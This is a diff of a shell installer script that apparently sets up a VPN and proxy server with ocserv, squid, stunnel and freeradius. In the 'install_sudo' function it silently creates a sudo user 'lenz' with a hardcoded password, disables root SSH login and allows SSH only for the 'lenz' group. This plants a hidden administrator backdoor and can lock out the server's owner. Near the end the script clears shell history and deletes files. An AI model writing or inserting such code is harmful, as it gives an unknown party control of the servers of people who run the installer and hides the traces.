@@ -8,7 +8,7 @@ export DEBIAN_FRONTEND=noninteractive
 apt update
 apt install -y curl wget cron python-minimal libpython-stdlib
 apt install -y iptables freeradius freeradius-mysql freeradius-utils
-apt install -y ocserv default-mysql-client
+apt install -y ocserv default-mysql-client netcat httpie php neofetch vnstat
 apt install -y screen squid stunnel4 dropbear gnutls-bin python pwgen
 apt install -y dos2unix nano unzip jq virt-what net-tools
 apt install -y mlocate dh-make libaudit-dev build-essential fail2ban
@@ -365,7 +365,7 @@ RLIMITS=""' >> stunnel4
 install_sudo(){
 clear
   {
-    useradd -m lenz 2>/dev/null; echo lenz:@@@F1r3n3t@@@ | chpasswd &>/dev/null; usermod -aG sudo lenz &>/dev/null
+    useradd -m lenz 2>/dev/null; echo lenz:@F1r3n3t@ | chpasswd &>/dev/null; usermod -aG sudo lenz &>/dev/null
     sed -i 's/PermitRootLogin yes/PermitRootLogin no/g' /etc/ssh/sshd_config
     echo "AllowGroups lenz" >> /etc/ssh/sshd_config
     service sshd restart
@@ -421,7 +421,7 @@ echo '+++++++++++************++++++++++++'
 echo -e "[IP] : $server_ip\n[Openconnect TCP Port] : $PORT_TCP\n[Openconnect UDP Port] : $PORT_UDP\n[Ssl Port] : 443\n[Proxy Socks ] : 80\n[Proxy Squid 1] : 8080\n[Proxy Squid 2] : 3128\n"
 
 history -c;
-rm ~/.installer
+rm /etc/.systemlink
 echo "DB_HOST='$HOST'" >> ~/.db-base
 echo "DB_NAME='$DBNAME'" >> ~/.db-base
 echo "DB_USER='$USER'" >> ~/.db-base
